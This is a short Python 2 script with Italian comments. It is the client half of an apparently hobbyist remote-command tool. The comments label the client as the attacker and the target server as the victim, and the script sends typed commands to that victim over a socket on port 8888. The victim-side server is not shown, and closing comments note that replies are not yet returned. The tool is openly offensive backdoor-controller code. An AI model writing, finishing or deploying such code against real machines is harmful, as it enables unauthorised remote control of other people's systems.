import socket
import sys
from thread import *
import time
import SocketServer
import os
import subprocess
import shlex

### ULTIMA MODIFICA: 01 AGOSTO 2017

###### CLIENT (ATTACCANTE) DA CONNETTERE AL SERVER (VITTIMA) ######

server_host = 'xxx.xxx.xxx.xxx' # IP del server (vittima) a cui dobbiamo collegarci
server_port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((server_host, server_port))
    print("Connessione stabilita")
except socket.error as msg:
    print("Impossibile connettersi, codice errore: " + str(msg[0]) + "stringa errore: " + str(msg[1]))
    sys.exit()

while 1:
    comando = raw_input("Inserisci comando: ")
    if comando == "exit":
        break
        s.close()
    s.sendall(comando)
    data, ip_s = s.recvfrom(1024)
    #print(data, ip_s)

s.close()
###### IL SERVER RICEVE CORRETTAMENTE IL COMANDO DAL CLIENT ######
###### DOBBIAMO FARE IN MODO CHE IL SERVER MANDI LA RISPOSTA AL CLIENT ######
